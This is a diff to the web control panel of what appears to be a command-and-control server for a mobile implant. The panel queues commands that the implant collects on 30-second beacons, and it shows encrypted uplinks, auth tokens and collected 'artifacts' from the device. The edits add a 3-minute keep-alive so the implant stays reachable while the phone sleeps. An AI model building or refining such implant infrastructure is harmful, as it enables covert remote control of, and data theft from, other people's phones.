@@ -348,11 +348,13 @@ textarea{resize:vertical;min-height:70px;font-family:var(--mono);font-size:12.5p
             <span>ℹ</span>
             <div>Commands are <b>pull-based</b>. The server queues them; the implant
             collects them on its next beacon and pushes the result back to
-            <code>/file.php</code>. Expect up to 30 seconds of latency.</div>
+            <code>/file.php</code>. Expect up to 30 s while its heartbeat service
+            runs, or up to 3 min when only the keep-alive alarm is waking it.</div>
           </div>
           <div class="kv">
             <span class="k">Uplink</span><span class="v">/panel.php · /file.php</span>
             <span class="k">Beacon</span><span class="v">every 30 s</span>
+            <span class="k">Keep-alive</span><span class="v">every 3 min</span>
             <span class="k">Envelope</span><span class="v">v=3&amp;d=&amp;k=&amp;i=</span>
             <span class="k">Crypto</span><span class="v">AES-256-CBC + RSA-2048</span>
             <span class="k">Auth</span><span class="v">X-Auth-Token</span>
@@ -391,7 +393,7 @@ textarea{resize:vertical;min-height:70px;font-family:var(--mono);font-size:12.5p
         <div class="empty"><div class="ico">📎</div>
           <div class="t">No artifacts yet</div>
           <div class="d">Command results land here. Send a command and give it
-          up to 30 seconds.</div></div>
+          up to 30 s, or 3 min if the phone is asleep.</div></div>
       </div>
     </div>
   </section>
@@ -614,7 +616,7 @@ async function sendCommand(){
     });
     fb.innerHTML = `<div class="notice ok"><span>✓</span><div>
       <b>${esc(r.command)}</b> queued (id ${r.id}). The device will collect it
-      on its next heartbeat — up to 30 seconds.</div></div>`;
+      on its next heartbeat — usually within 30 s, up to 3 min if asleep.</div></div>`;
     loadCommands();
   }catch(e){
     fb.innerHTML = `<div class="notice err"><span>✕</span><div>${esc(e.message)}</div></div>`;
@@ -665,7 +667,7 @@ async function loadArtifacts(){
       wrap.innerHTML = `<div class="empty"><div class="ico">📎</div>
         <div class="t">No artifacts yet</div>
         <div class="d">Command results land here. Send a command and give it
-        up to 30 seconds.</div></div>`;
+        up to 30 s, or 3 min if the phone is asleep.</div></div>`;
       return;
     }
     wrap.innerHTML = '<div class="art-grid">' + artifacts.map(a => `
